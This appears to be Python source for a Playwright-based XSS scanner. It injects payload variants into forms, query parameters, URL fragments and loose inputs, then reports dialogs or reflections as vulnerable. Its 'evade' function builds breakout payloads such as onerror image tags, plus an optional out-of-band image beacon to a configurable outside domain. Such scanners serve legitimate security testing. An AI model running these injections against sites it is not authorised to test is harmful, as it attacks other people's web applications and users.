from urllib.parse import urlparse, parse_qs, urlencode, quote
from termcolor import colored
import os
from html import escape as html_escape
import uuid


def evade(p):
    # Return multiple encoded/obfuscated variants to increase detection
    variants = []
    raw = p
    variants.append(raw)
    variants.append(f'">{raw}')
    variants.append(f'"> <img src=x onerror={raw}>')
    variants.append(f"';{raw}//")
    variants.append(html_escape(raw))
    variants.append(quote(raw))
    variants.append(f"<script>{raw}</script>")

    # OOB support: if OOB_DOMAIN is set, add an image/exfil variant
    oob = os.getenv('OOB_DOMAIN')
    if oob:
        nid = uuid.uuid4().hex[:8]
        oob_payload = f"<img src=\"http://{oob}/{nid}?c={quote(raw)}\">"
        variants.append(oob_payload)

    seen = set()
    out = []
    for v in variants:
        if v not in seen:
            seen.add(v)
            out.append(v)
    return out


def _content_variants(ev):
    # Variants to look for in page.content()
    return [ev, html_escape(ev), quote(ev), ev.replace('<', '&lt;')]


def test_form_vulnerability(page, form, payloads):
    vuln_count = 0
    page.goto(form['url'], wait_until="networkidle")

    # Define the XSS listener
    def handle_dialog(dialog):
        nonlocal vuln_count
        try:
            print(colored(f"VULNERABLE --> {page.url}", 'green', attrs=['bold']))
            vuln_count += 1

            dialog.accept()
        except Exception as e:
            if "already handled" in str(e):
                pass
            else:
                print(f"Debug: Dialog error: {e}")

    page.on("dialog", handle_dialog)

    for payload in payloads:
        for ev in evade(payload):
            try:
                filled = False
                for name, _ in form['inputs']:
                    field = page.locator(f"input[name='{name}'], textarea[name='{name}'], select[name='{name}']").first

                    if field.is_visible():
                        # If it can't fill it in 2 seconds, it's probably a "fake" or broken input
                        field.fill(ev, timeout=2000)
                        filled = True

                if not filled:
                    continue

                # Playwright tries to click the button, but if it fails, we use a 'force' submit
                submit_btn = page.locator("input[type=submit], button[type=submit], button").first

                try:
                    # 'timeout' here prevents the script from hanging forever if no button exists
                    submit_btn.click(timeout=2000)
                except:
                    # Fallback to JavaScript submit if button click fails
                    page.evaluate("document.querySelector('form').submit();")

                page.wait_for_timeout(300)
                print(colored(f"TESTED (Reflected) --> {page.url} (Payload: {ev})", 'blue'))

                page.goto(form['url'], wait_until="domcontentloaded")
                page.wait_for_timeout(300)
                print(colored(f"TESTED (Stored) --> {form['url']} (Payload: {ev})", 'blue'))
                try:
                    content = page.content()
                    for v in _content_variants(ev):
                        if v in content:
                            print(colored(f"VULNERABLE (reflected in HTML) --> {page.url}", 'green', attrs=['bold']))
                            vuln_count += 1
                            break
                except Exception:
                    pass

            except Exception:
                continue

    page.remove_listener("dialog", handle_dialog)
    return vuln_count


def test_url_parameters(page, url, payloads):
    vuln_count = 0
    parsed = urlparse(url)

    if not parsed.query:
        return 0

    params = parse_qs(parsed.query)

    # Define the listener for XSS alerts
    def handle_dialog(dialog):
        nonlocal vuln_count
        try:
            print(colored(f"VULNERABLE --> {page.url}", 'green', attrs=['bold']))
            vuln_count += 1

            dialog.accept()
        except Exception as e:
            if "already handled" in str(e):
                pass
            else:
                print(f"Debug: Dialog error: {e}")

    page.on("dialog", handle_dialog)

    for param in params:
        for payload in payloads:
            for ev in evade(payload):
                new_params = {k: ev if k == param else v[0] for k, v in params.items()}
                new_query = urlencode(new_params, doseq=True)
                test_url = parsed._replace(query=new_query).geturl()

                try:
                    # 'domcontentloaded' is faster than waiting for images/css
                    page.goto(test_url, wait_until="domcontentloaded", timeout=5000)

                    # Small buffer for JS execution/reflection
                    page.wait_for_timeout(200)

                    print(colored(f"TESTED --> {test_url}", 'blue'))
                    # Inspect content for silent reflections
                    try:
                        content = page.content()
                        for v in _content_variants(ev):
                            if v in content:
                                print(colored(f"VULNERABLE (reflected in HTML) --> {test_url}", 'green', attrs=['bold']))
                                vuln_count += 1
                                break
                    except Exception:
                        pass

                except Exception as e:
                    continue

    page.remove_listener("dialog", handle_dialog)

    return vuln_count


def test_fragment_parameters(page, url, payloads):
    """Test payloads appended to the URL fragment/hash (#) to catch DOM/hash-based sinks."""
    vuln_count = 0
    parsed = urlparse(url)
    base = parsed._replace(fragment="").geturl()

    # Define dialog listener
    def handle_dialog(dialog):
        nonlocal vuln_count
        try:
            print(colored(f"VULNERABLE --> {page.url}", 'green', attrs=['bold']))
            vuln_count += 1
            dialog.accept()
        except Exception as e:
            if "already handled" in str(e):
                pass

    page.on("dialog", handle_dialog)

    for payload in payloads:
        for ev in evade(payload):
            try:
                frag = quote(ev)
                test_url = base + "#" + frag
                page.goto(test_url, wait_until="domcontentloaded", timeout=5000)
                page.wait_for_timeout(300)
                print(colored(f"TESTED (fragment) --> {test_url}", 'blue'))

                try:
                    content = page.content()
                    for v in _content_variants(ev):
                        if v in content:
                            print(colored(f"VULNERABLE (reflected in HTML) --> {test_url}", 'green', attrs=['bold']))
                            vuln_count += 1
                            break
                except Exception:
                    pass

            except Exception:
                continue

    page.remove_listener("dialog", handle_dialog)
    return vuln_count


def test_loose_inputs(page, url, payloads):
    vuln_count = 0

    page.goto(url, wait_until="networkidle")

    # Playwright's locator handles the "find_elements" logic automatically
    input_selector = 'input[type="text"], input[type="search"], input[type="url"], input[type="email"], textarea'
    inputs = page.locator(input_selector)

    count = inputs.count()
    if count == 0:
        print(colored("[!] No loose inputs found.", 'yellow'))
        return 0

    print(colored(f"[+] Found {count} loose inputs to test", 'green'))

    for i in range(count):
        inp = inputs.nth(i)

        if not inp.is_visible() or not inp.is_enabled():
            continue

        for payload in payloads:
            for ev in evade(payload):
                try:
                    # Define the listener for XSS alerts
                    def handle_dialog(dialog):
                        nonlocal vuln_count
                        try:
                            print(colored(f"VULNERABLE --> {page.url}", 'green', attrs=['bold']))
                            vuln_count += 1

                            dialog.accept()
                        except Exception as e:
                            if "already handled" in str(e):
                                pass
                            else:
                                print(f"Debug: Dialog error: {e}")

                    page.once("dialog", handle_dialog)

                    inp.fill(ev)
                    inp.press("Enter")
                    page.wait_for_timeout(200)

                    print(colored(f"TESTED --> {page.url} (with payload: {ev})", 'blue'))

                    # Reset to original URL for next payload/input
                    page.goto(url, wait_until="domcontentloaded")

                    # Inspect content for reflections
                    try:
                        content = page.content()
                        for v in _content_variants(ev):
                            if v in content:
                                print(colored(f"VULNERABLE (reflected in HTML) --> {page.url}", 'green', attrs=['bold']))
                                vuln_count += 1
                                break
                    except Exception:
                        pass

                except Exception as e:
                    continue

    return vuln_count
